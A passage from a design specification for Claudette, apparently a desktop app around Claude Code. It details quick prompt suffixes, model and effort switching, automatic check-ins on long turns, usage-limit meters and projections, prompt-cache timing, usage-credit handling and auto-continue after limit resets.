- **After a slash command.** Claude Code takes everything after a command's name as its arguments, so a message that starts with `/` gets its suffixes in a text block of their own before the command instead. A command that runs a prompt (a skill or a custom command) gets them alongside that prompt, and its arguments stay what was typed. A local command such as `/compact` or `/model` doesn't query the model, so its suffixes change nothing (checked against 2.1.284).
- **Keeping one on.** Right-click a chip → **Keep on this tab** (**Stop keeping on this tab** on a chip that's kept) adds that suffix to every message in the tab until it's turned off. A kept chip is marked "(kept)". Kept suffixes are saved with the tab.
- **Own shortcut.** Each suffix can have its own keyboard shortcut that adds it directly.
- **Managing them.** Settings → Keyboard → **Quick suffixes**: add, edit, reorder and delete. Each suffix has a short **label** (shown in the dropdown and on the chip) and its **text**. Dropdown entries also include **Edit suffixes…** as a shortcut to Settings.
- **Built-in examples.** These can be edited or deleted, and **Reset to defaults** brings them back:

  | Label | Text |
  |---|---|
  | Clarify first | Ask clarifying questions before you start. |
  | Plan only | Don't change any files yet. Explain your plan and wait for me to approve it. |
  | Keep it small | Keep the change as small as possible and don't refactor unrelated code. |
  | Test it | Run the relevant tests when you're done and fix any failures. |
  | Explain | Explain what you changed and why when you're done. |

### Model & effort

- The composer bar shows the tab's current **model** and **effort level** as two clickable indicators. They always show what the session is actually using, including changes made with `/model` or other slash commands.
- **Effort.** Clicking the effort indicator opens a dropdown of the levels the current model supports. Picking one applies it to the session right away, starting with the next turn. No confirmation is needed.
- **Model.** Clicking the model indicator opens a dropdown of the available models. Picking a different one shows a confirmation first, and the choices are **Switch model** and **Cancel**:
  - *"Switching to Haiku resets this tab's cached context. The new model has to re-read the whole conversation, so your next message will use more of your limits."*, with the new model's name.
  - If the new model doesn't support the current effort level, the effort falls back to that model's default, and the dialog says so.
  - The conversation itself is kept. Claude Code applies a model switch in place, even in the middle of a turn.
- The model list and each model's effort levels come from Claude Code (see [Integration](#integration-with-claude-code)), not a list built into Claudette.
- New tabs start with the default model and effort from Settings.
- **Fallback model.** Settings → Claude Code → **Fallback model** (none by default) starts tabs with `--fallback-model`: when the tab's model is overloaded, Claude Code switches to that one rather than wait. It applies to tabs started after the change.
- **Ultracode** (✅ built 2026-10-01), a switch at the foot of the effort dropdown, lets Claude run workflows of subagents on its own for big tasks ([ultracode](https://code.claude.com/docs/en/workflows)), at the tab's effort level, as VS Code's switch does since 2.1.284. It applies from the next turn (`apply_flag_settings` with `ultracode`, `null` to turn it off), is kept with the tab and applied again whenever its Claude Code starts, and the effort indicator says so (*"High · Ultracode"*). It uses more of the plan, as its description says.
- **Output style** (✅ built 2026-10-01), under the switch in a section headed **Output style, for this folder**, lists the styles the session offers (`available_output_styles` from `initialize`, the current one in bold): *Default*, *Explanatory*, *Learning* and the user's own. Choosing one keeps it in the folder's `.claude/settings.local.json` (`update_settings`), where `/output-style` keeps it, so terminal sessions there use it too, and it applies from the next reply. A tab started without the folder's own settings ([§7](#folder-trust)) doesn't offer it, since that's where the choice is kept.

### Check-ins on long turns

If a turn runs for a long time, Claudette can ask Claude how it's going, so a tab doesn't sit stuck and burn usage without anyone noticing.

- **Triggers.** Either of these starts a check-in; each can be set or turned off:
  - **Run time:** the turn has been running for longer than a set time (default 15 minutes).
  - **Quiet time:** the turn has produced no new output for a set time (default 5 minutes).
- **Counting down.** When a check-in is due, a bar over the composer counts down 30 seconds first: *Checking in with Claude in 30s.*, with the message as its tip.
  - **Send now** sends it straight away.
  - ✕ (**Don't check in**) skips it. The timers restart, so the next check-in comes a whole interval later, as if Claude had just said something.
  - It's withdrawn if the turn no longer calls for it: Claude said something after a quiet spell, a permission prompt or question came up, or the turn ended.
  - Once it's sent it can't be taken back. Claude Code has no way to withdraw one message it's holding for the turn, only an interrupt that stops the turn and drops them all.
- **What happens.** Claudette sends a message to the session, the same as if the user had typed it while Claude was working. Claude Code delivers it inside the running turn, and the turn continues. The default message is:
  > *Everything OK? Give me a one or two sentence status update: what you're doing, and whether you're stuck or waiting on something.*
- **In the conversation.** The check-in appears as a user message with an "Automatic check-in" label, so it's clear the user didn't type it. Claude's reply appears as normal.
- **Limits.**
  - At most one check-in per interval. The timers restart after Claude replies.
  - No check-in while the tab is waiting on a permission prompt or question. That is waiting on the user, not on Claude.
  - Claude only sees the message between steps. The spike confirmed that a message sent during a tool call arrives with that tool's result, inside the same turn. So if a single command is running (for example a long test run), the check-in is delivered when that command finishes.
  - If Claude is in the middle of a long text-only reply, the check-in runs as the next turn instead.
  - After two check-ins in a row get no reply, Claudette stops sending them for that turn. It marks the tab as possibly stuck and offers **Stop**.
- **Settings.** Configured in Settings → Tabs → **Check-ins on long turns**, including the message text and an option to also send an OS notification when a check-in is sent. Each tab can override them ([§14](#per-tab-overrides)).
- Check-ins use a small amount of usage, which is counted in the tab's token stats like any other message.

## 6. Token Burn Awareness

This is Claudette's main feature: knowing how fast you're using your plan's limits without running `/usage`.

### Header meters

- **Session (5-hour window)**, the most prominent:
  - Progress bar with % used.
  - Countdown to reset ("resets in 2h 14m", with the clock time in a tooltip).
  - Every meter's bar, the weekly and each model's as well as the session's, turns amber at 75% and red at 90%. Settings → Usage → **Warn at (% of the session used)** and **Alert at (% of the session used)** change the two.
- **Weekly limits**, smaller and to the side:
  - Weekly limit across all models.
  - Each model-specific weekly limit the plan has (for example Fable).
  - Each shows % used and its reset day and time in a tooltip.
  - They stack one above the other, the limit across all models on top, with their bars lined up.

### Burn trendline

- A sparkline between the session meter and the weekly limits showing usage % over the current window, as tall as the session meter and the plain-language line under it together.
- A dotted **projection** line continues the current rate forward.
- A plain-language line under the meter:
  - "At this rate you'll hit the limit in 1h 05m, 1h 09m before it resets" (amber/red), or
  - "On track: about 70% used when the session resets" (neutral).
- **Rate** is measured over a recent window (by default the last 30 minutes, using a moving average), so a single big turn doesn't swing the projection wildly. When nothing is running, the projection says so instead of showing a stale rate.
- Clicking the header opens a **Usage** panel (its own window) with:
  - A larger chart of the current session and the past week.
  - Tokens per tab for the current window, so you can see which session is burning the most. A tab closed since then keeps the last name it had, from the [usage history](#usage-history), after a restart too. Only the Default account's turns count: an API key's don't use the plan ([§4](#accounts)).
  - Past sessions and weeks, as far back as the stored [usage history](#usage-history) goes. Each past window shows the highest usage it reached. The lists show the latest 30 sessions and 12 weeks, with **Show more** for the next page.
- Accounts without plan limits (an API key, for example) get no meters; the header just says Claudette. While the selected tab runs under one of Claudette's API-key accounts, the header shows that account's estimated spend instead ([§4](#accounts)).

### Detailed header

The header can be drawn taller, with charts, for keeping an eye on usage without opening the Usage panel.

- **Turning it on.** A chevron at the header's right expands it, and collapses it again. Settings → Usage → **Detailed usage header** is the same switch.
  - The choice is remembered on this machine and doesn't sync, like the sidebar's collapsed state.
  - Collapsed, the header is exactly as described above.
- **Layout.** The one-line header stays on top. Under it, about 150 px high: the session chart, the weekly chart, the numbers and the busiest tabs, left to right.
- **Session chart.** Usage over the current 5-hour window, from its start to its reset.
  - Faint bands above the warning and critical thresholds (Settings → Usage), with a dashed line at each.
  - The dotted projection from now, a "now" marker, and times at the start, now and the reset.
  - When the projection crosses the critical threshold before the reset, that point is marked and the chart says when: "Hits 90% at 14:05, 1h 16m before it resets." Past the threshold, it marks the limit instead: "Hits the limit at …".
- **Weekly chart.** Usage over the current 7-day window, with a tick at each midnight and the days' names, and the projection to the week's reset.
  - The weekly projection uses the week's average pace so far, not the burn rate window: a week has nights and days off in it.
  - Model-specific weekly limits are thinner lines, with a legend, when the model meters are on (Settings → Usage). Two get a line at most: more hues than that don't stay distinct beside the accent color.
- **Numbers.**
  - **Burn rate:** % per hour over the burn rate window, or *Idle*.
  - **Time to limit** at that rate, and whether that's before the reset or the window resets first.
  - **Busiest tabs:** the top three tabs by tokens this window, as "name 41%" with a small bar. It's the same count as the Usage panel's list of tabs, the Default account's turns only, and a closed tab keeps its last name there too.
- Clicking the charts opens the Usage panel, as the header does.
- **Narrow windows** leave out the busiest tabs first (below 960 px), then the weekly chart (below 700 px). The session chart takes the room.
- Accounts without plan limits get no charts, as they get no meters.
- **Data.**
  - The session chart uses the same readings as the sparkline.
  - The week and the busiest tabs are read from the [usage history](#usage-history), off the UI thread and only while the charts show: when they open, when a new sample may have been stored (at most once a minute) or a window reset, and after each turn.
  - The charts draw the last value in each minute (session) or each 15 minutes (week), not every sample.
- **Drawing.** Claudette draws the charts itself, with no charting package. They use the app's color tokens, so they follow the light and dark theme; the model lines' two colors were checked against the accent and each other, including for color blindness.

### Per-tab context

Separate from plan limits, each tab shows how full its **context window** is (in the composer bar). It warns near the auto-compact threshold and has a quick **Compact** action.

- **What fills it.** Clicking the context indicator, or the tab's context ring in the sidebar, shows what fills the window, as Claude Code's `/context` does, from the same `get_context_usage` reply:
  - The total and the window (*"124,000 of 200,000 tokens · auto-compacts at 167,000"*).
  - A bar of the whole window, each part as wide as its share, then the free space and the auto-compact buffer (hatched). Hovering a part names it with its tokens and share; a part too small to see keeps a sliver.
  - A row for each part, with its color, tokens and share of the window. Tools Claude Code holds out of the window until they're needed (*MCP tools (deferred)*) are listed last, without a color or share.
  - What's inside the larger parts, each collapsed until it's clicked: the memory files, the MCP servers (with how many tools, and how many aren't loaded), custom agents, skills (and how many of those found made it into the listing), and the messages (tool results, tool calls, attachments, the user's messages and Claude's replies, then by tool and by attachment). A part left open stays open when the breakdown refreshes after a turn.
  - The warning when it's nearly full (*"Nearly full. Claude Code will compact the conversation soon on its own."*, or with auto-compact off *"Nearly full. Compact now to free up context."*), and **Compact now**, which sends `/compact` to the session.
  - **The bar's order and colors.** The parts go memory files, skills, system prompt, custom agents, system tools, MCP tools, messages, rather than in `/context`'s order. The colors are the categorical palette, checked with its validator (color blindness included) for every two parts that can end up side by side, in light and dark. Parts come and go (no MCP tools, no custom agents), so in `/context`'s order nearly every pair can meet, and no eight colors keep all of those apart. Putting the parts every session has (system prompt, system tools, messages) between the others limits which can meet. A part Claudette doesn't know by name gets one more color and goes after messages.
  - Without a buffer row (Claude Code 2.1.284 sends none), the space past the auto-compact threshold is the buffer, as `/context` shows it.
  - When `get_context_usage` isn't available, it shows the estimate: how much is in the window and the free space, and that this version of Claude Code doesn't say what.
- A `compact_boundary` message adds a "Conversation compacted" note, or says Claude Code compacted it by itself.
- **On every tab's row.** A small ring in the sidebar shows the same percentage for each tab, so a tab nearing its limit stands out without selecting it ([§4](#sidebar)). It's muted, amber when the indicator warns, and red from 95%. It comes from the same `get_context_usage` reply, or the same estimate when that isn't available.

### Prompt cache

Anthropic's prompt cache keeps a conversation for a while after each request that reads or writes it: five minutes, or an hour. A message sent in that time reads the conversation from the cache, at a fraction of the price (on a subscription, for much less of the usage limits); after it, Claude reads the whole conversation again in full. Each tab shows how long its cache has left.

- **The chip.** In the composer's bar, after the context indicator: *"Cache 52m"*, in whole minutes rounded down, so it never promises more than there is. In the last 3 minutes it turns the caution color and reads *"Cache 2m"*, then *"Cache <1m"*; once it has run out, *"Cache expired"*, muted.
- **When it shows.** Not before the conversation's first request (there's no cache yet), and not while a turn runs: its requests keep the cache fresh, and the working line shows. It shows while a prompt waits on the user mid-turn, since nothing refreshes the cache then. Not at all when Claude Code doesn't cache the tab's prompts: `DISABLE_PROMPT_CACHING`, or `DISABLE_PROMPT_CACHING_OPUS` and the others for a family's models, matched by the family's name in the tab's model. Settings → Conversation → **Show when the prompt cache expires** (on by default) turns it off.
- **The tooltip** says what the cache is, its lifetime and where that came from (*"1-hour cache, as Claude Code usually gives subscriptions"*, *"5-minute cache, as Claude Code uses with an API key"*, *"set by CLAUDE_CODE_PROMPT_CACHE_TTL"*, *"seen in the last turn"*), and when it expires, in local time: *"Sent before 14:52, your next message reads this conversation from the cache. After that, Claude reads all of it again at the full price."* On a subscription it says all of it counts toward the usage limits instead.
- **When it starts.** At the end of each of the main agent's requests: its `assistant` messages, and the `result` of a turn that made a request (a local command such as `/cost` makes none). Subagents' requests have caches of their own, so they don't count, and neither does an error Claude Code reports as a message. A restored tab counts from the last of the main agent's replies in its transcript, so a tab reopened within the hour shows what's left. Clearing or compacting the conversation, switching the model (each model has its own cache) or moving the tab to another account ([§4](#accounts)) forgets it until the next request.
- **The lifetime** is the first of these that applies:
  1. Claude Code's own configuration, as the tab's `claude` gets it: the environment it starts with, with the `env` of its settings files over it, and the `promptCacheTtl` setting, from the same files as `spinnerVerbs` ([§5](#working-line); the project's only when the tab uses them). In the order Claude Code's docs give: `FORCE_PROMPT_CACHING_5M`, then `CLAUDE_CODE_PROMPT_CACHE_TTL`, then `promptCacheTtl`, then `ENABLE_PROMPT_CACHING_1H`. It's read as the session starts.
  2. What Claude Code reported: the `cache_creation` of the main agent's latest call that wrote to the cache, when its usage breaks it down, or else of the turn's `result`, which can count subagents' writes. Tokens written at an hour (`ephemeral_1h_input_tokens`) mean an hour; only at five minutes, five minutes.
  3. Claude Code's default: an hour on a subscription's main conversation, five minutes with an API key or a cloud provider. A subscription only gets the hour within its included usage, which Claudette can't tell, so the tooltip says "usually". The tab is on an API key when it runs under one of Claudette's API-key accounts, when its session's `apiKeySource` on `system/init` names a key, or, before the session says, when the environment it starts with has `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN`; `claude auth status` tells a cloud provider. Anything else is taken for a subscription.
- **Updating.** The chip changes at most every 15 seconds, and only on a tab on screen, as the working line ticks; a tab catches up when it's shown.

**How it's built.** Core's `Sessions/PromptCache.cs` holds the logic: `PromptCacheConfig` reads the variables and the setting, through `Claude/ClaudeSettingsFiles` (which `SpinnerVerbs` and `StartingPermissionMode` read through too); `PromptCache.Resolve` picks the lifetime and `PromptCache.BillingOf` how the tab is paid for; `PromptCacheClock` keeps when the cache was last refreshed, on the injected clock, and `PromptCacheCountdown` what's left. `Protocol/PromptCacheWrites` is the typed view of `cache_creation`, as `ResultMessage.CacheWrites` and `AssistantMessage.CacheWrites`, and `SystemInitMessage.ApiKeySource` the session's key. `TabViewModel.PromptCache.cs` is the tab's side: it follows the session's events and the transcript a restore replays, reads the configuration as the session starts (the environment through `AppServices.ClaudeEnvironmentFor`, which tests replace), and ticks with a `UiTicker`. `PromptCacheTests` and `PromptCacheWritesTests` (Core), and `PromptCacheTests` (the tab).

### Alerts

An OS notification (optional) when:

- Session usage crosses the warning thresholds.
- The projection says you'll hit the limit before it resets.
- A limit resets.
- Usage credits start paying for Claude ([Usage credits](#usage-credits)).

Each alert fires once per window. The first reading after a restart doesn't alert for levels that were already crossed. The alert also shows as a dismissible line under the header, and the OS notification is skipped while Claudette is in front ([§10](#10-notifications)). A threshold alert's line keeps up with the session meter (the percentage, rounded the same way, and the countdown), so the two never disagree. The projection alert's line keeps up with the projection under the session meter in the same way, and goes once the projection no longer hits the limit before the reset.

### Usage credits

✅ Built 2026-10-16. A plan can have usage credits (claude.ai's extra usage): once a limit is used up, they pay for Claude instead of the plan, up to a cap. Claudette says so for as long as it's happening, so a used-up session doesn't quietly turn into a bill.

- **The notice.** While credits pay, a notice runs across the top, straight under the header, in the caution color: **Using usage credits.** *"Your session limit is used up, so your usage credits pay for Claude until it resets at 15:45. $12.40 of $50.00 spent this month."*
  - The limit is the one Claude Code names (session, weekly, Opus, Sonnet), and its reset reads as the auto-continue bar's does (*"on Mon at 09:00"* for another day).
  - The spend and cap are `get_usage`'s. An account without a cap of its own gets *"$12.40 spent this month."*: on Team and Enterprise plans that isn't no cap, so it isn't called unlimited. Without the spend, the line stops after the reset.
  - **Manage on claude.ai** opens the plan's usage there, where credits are turned off or capped.
- **It can't be dismissed.** It goes by itself when credits stop paying: the limit resets (the header's 30-second tick notices, without waiting for a reading), credits are turned off or reach their cap, or Claude Code says they aren't paying.
- It shows whichever tab is selected, one on an API-key account too, since the Default account's tabs are spending them ([§4](#accounts)), except those that don't use them ([Tabs that don't use usage credits](#tabs-that-dont-use-usage-credits)).
- **The alert.** An OS notification when credits start paying, *"Using usage credits"* with the notice's line, once each time they start. Not for credits already paying at the first reading after a launch, as with the other alerts. It's a usage alert: Settings → Notifications' usage alerts switch turns it off, and it's skipped while Claudette is in front ([§10](#10-notifications)). It has no line under the header, since the notice says it already.
- **Knowing.** From two sources, the newer deciding:
  - **Claude Code's word.** Each `rate_limit_event` carries `isUsingOverage` (undocumented), true while credits pay, with `rateLimitType` and `resetsAt` for the limit that's used up (then `status` is `rejected` and `overageStatus` `allowed`; the turn carries on). Claudette believes it until that limit resets; without `resetsAt`, until the latest reset of any limit at 100%.
  - **The poll.** `get_usage`'s `rate_limits.extra_usage`, which the Agent SDK's reference documents: `is_enabled` (whether credits can pay now), and `used_credits` and `monthly_limit` in minor units of `currency` (cents for USD; none is taken for USD). With credits on and the session or weekly limit at 100%, they pay until it resets, the later one when both are. A model's own limit doesn't count here: only that model's requests would pay, and the poll can't say which model Claude is using.
  - Credits reported unable to pay since Claude Code last said they were paying end it. Claude Code saying they aren't, since the last poll, ends it; saying so before the poll that found a limit used up (used up elsewhere: claude.ai, another machine) doesn't.
  - Each is kept until its own source says again: an event doesn't clear the poll's spend, and a poll doesn't clear Claude Code's word. Neither goes in the usage history, so after a restart the notice waits for the first poll or event; a reading another machine shared keeps this machine's last word on credits.
  - Only the Default account's events count, as for the meters ([Sampling](#data-source)).

**How it's built.** `Claudette.Usage/UsageCredits.cs`: `UsageCredits` (the poll's), `CreditsReport` (Claude Code's word) and `CreditUse.From` (the rule above), with `Describe` for the line. `UsageParser` reads them onto `UsageSnapshot.Credits` and `CreditsReport`, and `Merge` keeps each until its own source says again; `UsageAlerts` raises `UsingCredits`. `UsageViewModel.CreditsNotice` is the notice's line, `CreditsNotice` in `MainWindow` the notice. `UsageCreditsTests`, `UsageParserTests` and `UsageAlertsTests` (Usage), `UsageHeaderTests` (App, through `get_usage` and events) and `UsageCreditsUiTests`.

### Tabs that don't use usage credits

✅ Built 2026-10-16. Usage credits pay for every tab on the Default account alike once a limit is used up. A tab can do without them, so they go only to the work that matters: it stops instead, and waits for the limit to reset, as at a limit with no credits behind it.

- **Choosing.** Settings → Tabs → **Use usage credits once a limit is used up** (on by default) is every tab's choice. **Use usage credits**, a tick in a tab's menu ([Sidebar](#sidebar)), or **Usage credits** in **Tab settings…** (Default, On or Off; [§14](#per-tab-overrides)) changes it for one tab. The menu keeps the tab's own choice only while it differs from Settings, so ticking it back to what Settings says leaves the tab following Settings again. Only tabs on the Default account have them: an API-key account has no plan, so its tabs have neither the item nor the choice ([Accounts](#accounts)).
- **Claude Code can't refuse them** for one session: no flag, setting or environment variable does, in its docs or in 2.1.284. So Claudette does, two ways:
  - **Before sending.** While credits pay by the header's reading ([Usage credits](#usage-credits)), what the tab would send is held rather than sent: the user's message, the task list's **Continue**, a thread's message to it, and its sub-threads' report. Its card says *"Queued: sent when the usage limit resets"*, with **Send now**, which sends it anyway, paid for with credits, and **Cancel**, which takes it back to the composer ([Queued messages](#queued-messages)). Without a reset time (Claude Code said credits pay, and nothing said until when) nothing is held, and the turn is stopped once it starts.
  - **During a turn.** A `rate_limit_event` on the tab's own session with `isUsingOverage` true (undocumented; [Usage credits](#usage-credits)) means credits have begun paying for the turn. Claudette interrupts it, with what was waiting its turn in Claude Code (`cancel_queued`), which would run on credits too: the user's messages and the thread's among those are held for the reset as above, and Claudette's check-ins are dropped. The request that brought the event is already paid for, since Claude Code reports it only afterwards. The conversation gets a note: *"Usage credits began paying for Claude, and this tab doesn't use them, so Claudette stopped the turn."* A turn sent with **Send now** isn't stopped.
- **Waiting.** Either way the tab waits for the limit to reset as after a usage limit ([Continuing after a limit resets](#continuing-after-a-limit-resets)): the same bar, the tab's row, the hourglass, saved with the tab. The bar says why: *"Your session limit is used up, and this tab doesn't use usage credits, so Claude stopped. The task continues by itself when it resets, at 15:45."*, or, while it holds a message, *"… Your message is sent when it resets, at 15:45."*
  - A stopped task follows the auto-continue setting and its rules, **Don't continue** included.
  - A held message goes at the reset in the continue's place, as the user's own message during a wait would, and whatever auto-continue says, since the user sent it. Others held go one per turn after it.
  - A message held while nothing was stopped has no **Don't continue** or close button on its bar: its card's **Cancel** takes it back, and the bar goes with the last one.
  - **Use usage credits** on the bar turns them on for the tab: a wait that would have continued by itself continues now, and one that wouldn't closes and sends what was held. Turning them on from the menu, **Tab settings…** or Settings does the same.

**How it's built.** `TabViewModel.UsageCredits.cs`: `CreditsBlocking` reads `CreditUse.From` off the header's reading (`UsageTracker.Current`), `HoldForCredits` holds a message on the queue with `UserMessageItem.IsHeldForCredits`, and `StopIfCreditsPay` stops a turn. The wait is `AutoContinueMonitor`'s, with `LimitWait.Cause` (`CreditsOff`, `MessageHeld`), `StoppedForCredits`, `HoldingForCredits`, `HeldMessagesGone` and `CreditsAllowed`; a rejection credits pay for doesn't start a wait for the limit. `AutoContinueMonitorTests` (Core) and `UsageCreditsTabTests` (App).

### Continuing after a limit resets

When a plan usage limit stops Claude mid-task, the tab waits for the limit to reset and then continues the task, so work left running overnight or over lunch picks up again in the new session window. It's on by default: Settings → Tabs → **Continue tasks when a usage limit resets** turns it off everywhere, and each tab can turn it on or off for itself in **Tab settings…** ([§14](#per-tab-overrides)). A tab that doesn't use usage credits waits the same way once they'd pay for it ([Tabs that don't use usage credits](#tabs-that-dont-use-usage-credits)).

Claude Code does the same in its own terminal (`autoContinueAtUsageLimit`, since 2.1.234), but not in `-p` runs such as Claudette's, so Claudette does it. It follows Claude Code's rules where they apply.

- **Noticing.** A turn stopped at the limit ends with an error (`result` with `is_error`, and `api_error_status` 429 or none), and Claude Code sends a `rate_limit_event` with `status: rejected` and `resetsAt`, in either order. Its `rateLimitType` names the limit (session, weekly, Opus or Sonnet), as Claude Code's own message does (*"You've hit your session limit · resets 3:45pm"*, which still shows as the turn's error). Not a limit that waiting fixes:
  - A rejection with an `errorCode`, such as `credits_required`: the account needs usage credits.
  - A turn that ended any other way: stopped by the user, out of turns or budget, or a server error.
  - A rejection the turn got past, for example on usage credits ([Usage credits](#usage-credits)).
- **Continuing.** A minute after the reset, the tab sends *"Continue from where you left off."*, the prompt Claude Code uses. It appears as a user message labeled *"Automatic continue after the usage limit reset"*, as a check-in is labeled ([§5](#check-ins-on-long-turns)). It doesn't resend the user's last message. The continued turn is like any other: it still asks for permissions, so it can stop on a prompt while the user is away.
- **While it waits.**
  - A bar over the composer says so: *"You've hit your session limit. The task continues by itself when it resets, at 15:45."*, with **Don't continue**, and **Play a game while you wait** ([§18](#games-with-claudette)).
  - The tab's row shows *Usage limit · continues at 15:45* in place of the model ([§4](#sidebar)), and its info card has a **Usage limit** row with the bar's text.
  - The Dock or taskbar icon shows an hourglass until the limit resets ([§10](#10-notifications)).
  - A day other than today reads *"on Mon at 09:00"*.
  - A computer that sleeps through the reset misses it (below). **Keep this computer awake** (Settings → General, or the header's cup) holds sleep off while a tab waits to carry on ([§9](#keeping-the-computer-awake)).
- **When it doesn't continue by itself** the bar says why, with **Continue when it resets** (or **Continue**, once it has) and a close button:
  - Turned off, in Settings or for the tab: *"You've hit your session limit. It resets at 15:45."*
  - **Don't continue**, for that reset. Hitting the limit again before it resets doesn't start another wait; the next window starts fresh.
  - The reset is more than a day away, as a weekly limit's can be.
  - Three continues in a row each ran straight into the limit again. Like Claude Code, it waits again at most twice, then stops (Claude Code says *"Automatic continue stopped after repeated usage-limit hits"*). A continue that gets going, or a message from the user, starts the count again.
  - The limit reset more than 30 minutes before Claudette noticed, because the computer slept through it or Claudette wasn't running: *"Your session limit reset at 15:45 while this computer was asleep or Claudette was closed, so the task didn't continue by itself."* Claude Code also waits for the user after a long sleep.
- **Ending the wait.** Any turn that starts ends it: the user sent a message, or something else started one. A tab that doesn't use usage credits holds the user's message instead, while they pay ([Tabs that don't use usage credits](#tabs-that-dont-use-usage-credits)). Turning the setting off or on while a tab waits changes that wait straight away.
- **Saved with the tab**, so a restart, including one into a new build ([§9](#working-on-claudette)), keeps waiting. A restored tab that hasn't started is started to continue.

### Data source

Plan limits come from three sources, tried in order. All three were confirmed by the milestone 1 spike (2026-09-28, Claude Code 2.1.284), and none of them uses tokens.

| # | Source | What it gives | Notes |
|---|---|---|---|
| 1 | The `get_usage` control request | A `rate_limits.limits` list with one entry per limit: `kind` (`session`, `weekly_all`, or `weekly_scoped` with `scope.model.display_name` such as "Fable"), plus `percent`, `severity` (`normal` … `critical`), `resets_at` and `is_active` | Everything the header needs, including model-specific weekly limits, and the plan's usage credits in `rate_limits.extra_usage` ([Usage credits](#usage-credits)). **Undocumented:** the TypeScript SDK exposes it as `usage_EXPERIMENTAL_MAY_CHANGE_DO_NOT_RELY_ON_THIS_API_YET`. |
| 2 | `rate_limit_event` messages, sent after model calls | `rateLimitType`, `status`, and `unifiedWindows.five_hour` / `seven_day`, each with `utilization` (0–1) and `resetsAt` (epoch seconds) | Session and weekly only, with no model-specific limits. The documented type only lists `status`, `utilization` and `resetsAt`; the window fields are undocumented, as is `isUsingOverage`, whether usage credits are paying. |
| 3 | `/usage` sent as a prompt | Text such as `Current week (Fable): 100% used · resets Sep 30, 6:59am` | A local command, so it's free and makes no model call. Parsing the text is brittle; last resort only. |

The status line's `rate_limits` data can't be used: the spike confirmed that status line commands don't run in headless mode.

Token and context data are documented:

| Data | Source |
|---|---|
| Tokens per turn and per tab | `modelUsage` on each `result` message, by model with `costUSD` and `contextWindow`, subagents and compaction included. It's the `claude` process's running total, not the turn's, so a turn is what it added to the result before (`ProcessUsage`): a model whose figures didn't grow wasn't used. `/clear` (`conversation_reset`) starts the totals again; a result with none (`/clear`'s own, an interrupt before anything was counted, a crash's zeroed one) counts nothing. A resumed or forked session's process starts from the totals Claude Code saved in the transcript when the last one exited normally (`cost-state` entries, undocumented), so its first turn counts from the latest one its result could have grown from. Per-call `usage` on `assistant` messages moves the composer's count during a turn: Claude Code repeats a call's usage on each of its content blocks, so calls are counted once by message ID, with their latest figures. Turns recorded before Claudette worked this out counted every earlier turn of their process again; they're left as they were. |
| Context window % | The `get_context_usage` control request after each turn. Without it (it fails, or this Claude Code lacks it), an estimate: the main agent's latest call (everything it read plus what it wrote) ÷ that model's `contextWindow` from the last `result`, updated with each call. The estimate warns at 90% of the auto-compact threshold from `autocompact_state` (undocumented; sent before each turn with `enabled`, `effective_window` and `threshold`), or at 80% without it. |

**Sampling.**

- Plan usage is the Default account's, tracked app-wide, not per tab. Tabs under an API-key account have no plan limits, and their `rate_limit_event`s are left out ([§4](#accounts)).
- Claudette calls `get_usage` on launch, after each turn (at most once a minute), and every 5 minutes otherwise. It uses a hidden **utility session** for this ([§13](#integration-with-claude-code)), so the header stays current even when no tab is working.
- `rate_limit_event` messages from any tab update the header immediately between polls. They carry only the session and weekly windows, so the model-specific readings from the last poll are kept.
- If `get_usage` fails or changes shape, Claudette falls back to `rate_limit_event`, and hides the model-specific meters unless the `/usage` fallback is turned on (Settings → Usage → **If Claude Code stops reporting them, read them from /usage**, off by default; **Show model-specific weekly limits** is on by default). It keeps trying `get_usage` on the normal schedule.
- The `/usage` fallback sends `/usage` to the utility session as a message and reads the text it prints.
- Reset times from the two sources differ by fractions of a second (`02:19:59.95` against `02:20:00`), so they're rounded to the second before being compared.
- **Stale readings.** When Anthropic's usage endpoint fails, `get_usage` answers from Claude Code's cached reading (`cachedUsageUtilization` in `~/.claude.json`, kept for an hour) and doesn't say so. Seen on 2.1.284: polls kept reporting 85% for 20 minutes while `rate_limit_event`s climbed to 90%, so the meter fell back after the 90% alert. Within one window a limit's usage only rises, so every reading, from any source, merges with the current one: a lower reading for the same window, or one for an earlier window, is stale, and the meter keeps the current value. Once the current value hasn't been reported for an hour (no cached reading is older), a lower one is believed, since the limit really went down, as after a plan change. Readings without a reset time replace the current one.
- After a restart, the header shows the last stored sample (with "as of" its time) until the first poll, and the first readings merge with it the same way.

**Extra data.** `get_usage` also reports what's contributing to usage, such as the share of requests at long context and the top skills and subagents over the last day and week. That could become a panel later; it's not in v1.

### Usage history

Claudette stores usage data locally in a SQLite file in the app data folder, so the trendline, charts and per-tab stats survive restarts. The file is per machine and isn't synced, though its plan usage samples and synced tabs' turns can be shared ([Sharing across machines](#sharing-across-machines)). It holds three kinds of records.

**Plan usage samples** (app-wide):

- Timestamp.
- Session (5-hour) % used and its reset time.
- Weekly (7-day) % used and its reset time.
- Model-specific weekly % (for example Fable), if that meter is on.

A sample is saved only when a value changes, and at most once a minute. These feed the trendline and projection, the weekly charts (the Usage panel's and the [detailed header](#detailed-header)'s), and the header after a restart.

**Per-turn token records** (per tab):

- Timestamp.
- Tab and session ID.
- The tab's folder (its project). Turns recorded before Claudette kept it have none.
- The project's key and name: a hash of the git remote and the folder's path inside the repository, the same on every machine with a clone of it, as the scratch pad's ([§18](#scratch-pad)); without a remote, a hash of the folder that's this machine's own. The name is the folder's, or a worktree's main checkout's. Turns recorded before keys were kept are given their folder's key at launch, when the folder still exists, so a project stays one row; their counts aren't touched.
- Model.
- Input, output, cache write and cache read tokens.
- Estimated cost.
- The account the tab ran under; none for the Default account, as for turns recorded before accounts ([§4](#accounts)). An API-key account's name too, and for the Default account, a hash of the plan account it was signed in to.
- An id of its own, kept on every machine it's shared with, and for a turn another machine shared, which machine that was ([Sharing across machines](#sharing-across-machines)). Turns recorded before turns were shared have no id and are never shared.

These feed each tab's per-turn chart, the "which tab is burning the most" view, the detailed header's busiest tabs, and the Usage panel's **Projects** list.

**Projects** (Usage panel): tokens, estimated cost and turns per project, across every tab that worked in it, open or closed, in any of its folders (a worktree, another clone), heaviest first, with each one's share of the total. A picker chooses the period: **This session window**, **This week** (the default, like the chart beside it) or **The last 30 days** (as far as **Keep usage history** allows). A row is named by its folder; two of the same name show their parent folder too, and the tooltip has the full path. Turns from before projects were kept are one row, **Earlier turns**. With other machines' turns, see [Sharing across machines](#sharing-across-machines).

